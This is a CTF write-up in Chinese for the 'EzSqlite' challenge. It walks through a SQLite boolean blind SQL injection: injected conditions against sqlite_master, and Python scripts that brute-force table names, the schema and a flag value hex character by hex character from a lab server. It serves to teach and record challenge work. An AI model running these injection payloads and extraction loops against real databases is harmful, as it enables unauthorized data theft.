## EzSqlite

`tjctf{c1fc5932-2b06-45ed-b8f2-1eaaa226939b}`



Sqlite 布尔盲注

在查询的后面几个结果里也放了提示了（bool injection，sqlite）。

页面上有两个请求参数 `id` 和 `username`，测试发现 POST 参数为 `id=id` 时查询有结果。因此可以通过检查 `id=id and 条件;` 是否有结果来测试`条件`是否为真。

### 1. 猜解表数量

```sql
id=id and 2=(select count(tbl_name) from sqlite_master where type="table")
```

得出数据库中有两张表。

### 2. 猜解表名长度

```sql
id=id and 3=(select length(tbl_name) from sqlite_master where type="table")
```

可以知道其中一张表的长度为3

```sql
id=id and 9=(select length(tbl_name) from sqlite_master where type="table" and length(tbl_name)<>3)
```

可以知道另一张表的长度为9。

### 3. 猜解表名

猜长度为3的表的名字：

```python
def decode(a):
    for i in range(len(a)//2):
        hex = '0x' + a[2*i:2*i+2]
        i = int(hex, 16)
        ch = chr(i)
        print(ch, end='')

hex_a = ''
for i in range(1, 7):
    for ch in string.hexdigits:
        res = requests.post("http://10.10.175.100:38081/",
                            data={'id': f'id and "{ch}"=(select substr(hex(tbl_name),{i},1) from sqlite_master where type="table" and length(tbl_name)=3);'})
        if 'meow' in res.text[-80:]:
            hex_a += ch
            break

print(decode(hex_a))
```

得到结果`ctf`，

猜长度为9的表的名字：

```python
hex_a = ''
for i in range(1, 19):
    for ch in string.hexdigits:
        res = requests.post("http://10.10.175.100:38081/",
                            data={'id': f'id and "{ch}"=(select substr(hex(tbl_name),{i},1) from sqlite_master where type="table" and length(tbl_name)=9);'})
        if 'meow' in res.text[-80:]:
            hex_a += ch
            break

print(decode(hex_a))
```

得到结果：`ffffflagg`。

### 4. 猜解`ffffflagg`表的列名

```python
hex_a = ''
for i in range(1, 121):
    for ch in string.hexdigits:
        res = requests.post("http://10.10.175.100:38081/",
                            data={'id': f'id and "{ch}"=(select substr(hex(sql),{i},1) from sqlite_master where type="table" and length(tbl_name)=9);'})
        if 'meow' in res.text[-80:]:
            hex_a += ch
            break

print(decode(hex_a))
```

得到结果`CREATE TABLE .....`，从中得知`ffffflagg`表只有一列，列名为`ffll4aaa9g`。

### 5. 猜解`ffffflagg`表`ffll4aaa9g`列的值

```python
hex_a = ''
for i in range(1, 120):
    for ch in string.hexdigits:
        res = requests.post("http://10.10.175.100:38081/",
                            data={'id': f'id and "{ch}"=(select substr(hex(ffll4aaa9g),{i},1) from ffffflagg);'})
        if 'meow' in res.text[-80:]:
            hex_a += ch
            break

print(decode(hex_a))
```

得到结果，flag 即为 `tjctf{c1fc5932-2b06-45ed-b8f2-1eaaa226939b}`。

